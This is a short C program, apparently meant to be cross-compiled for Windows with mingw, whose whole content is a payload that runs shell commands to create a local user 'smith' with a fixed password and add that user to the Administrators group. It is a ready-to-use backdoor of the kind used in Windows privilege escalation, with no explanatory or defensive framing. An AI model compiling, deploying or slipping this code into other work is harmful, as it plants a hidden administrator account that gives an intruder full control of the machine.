#include <stdlib.h>
/* system, NULL, EXIT_FAILURE */
/* i686-w64-mingw32-gcc useradd.c -o useradd.exe */
int main ()
{
	int i;
	i=system ("net user smith Password123! /add");
	int j;
	j=system ("net localgroup Administrators smith /add");
	return 0;
}
